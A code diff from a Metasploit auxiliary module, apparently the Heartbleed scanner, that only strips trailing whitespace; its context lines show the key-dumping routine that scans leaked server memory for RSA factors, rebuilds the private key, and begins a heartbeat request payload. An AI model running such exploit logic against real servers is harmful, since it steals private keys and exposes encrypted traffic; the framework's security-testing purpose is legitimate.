@@ -351,13 +351,13 @@ class Metasploit3 < Msf::Auxiliary
       print_error('TLS callbacks currently unsupported for keydumping action') #TODO
       return
     end
-   
+
     print_status("#{peer} - Scanning for private keys")
     count = 0
 
     print_status("#{peer} - Getting public key constants...")
     n, e = get_ne
-    
+
     if n.nil? || e.nil?
       print_error("#{peer} - Failed to get public key, aborting.")
     end
@@ -373,8 +373,8 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       p, q = get_factors(bleed, n) # Try to find factors in mem
-     
-      unless p.nil? || q.nil?  
+
+      unless p.nil? || q.nil?
         key = key_from_pqe(p, q, e)
         print_good("#{peer} - #{Time.now.getutc} - Got the private key")
 
@@ -393,7 +393,7 @@ class Metasploit3 < Msf::Auxiliary
       count += 1
     }
     print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES.")
-  end 
+  end
 
   def heartbeat(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
